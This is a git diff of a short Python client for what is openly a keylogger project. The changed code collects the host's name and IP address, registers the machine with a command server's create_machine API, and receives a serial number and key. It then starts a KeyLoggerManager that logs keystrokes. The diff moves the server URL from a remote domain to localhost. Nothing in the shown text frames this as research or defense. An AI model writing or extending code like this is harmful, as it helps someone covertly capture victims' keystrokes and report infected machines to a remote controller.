@@ -1,17 +1,21 @@
 import manager as keylogger
-import requests
+import requests,socket
 
-url = 'https://keylogger.shuvax.com/api/create_machine'
+url = 'http://127.0.0.1:9734/api/create_machine'
 
 
 def create_logger():
+    hostname = socket.gethostname()
+    ipaddress = socket.gethostbyname(hostname)
     data = {
-        "ip": "127.0.0.1"
+        "ip": ipaddress
     }
     try:
         response = requests.post(url, json=data)
-        number = response.json()['serial_number']
-        key_logger = keylogger.KeyLoggerManager(number)
+        response_dict = response.json()
+        number = response_dict['serial_number']
+        key = response_dict['key']
+        key_logger = keylogger.KeyLoggerManager(number,key)
         key_logger.start_logging()
         return response.status_code == 200
     except requests.exceptions.RequestException:
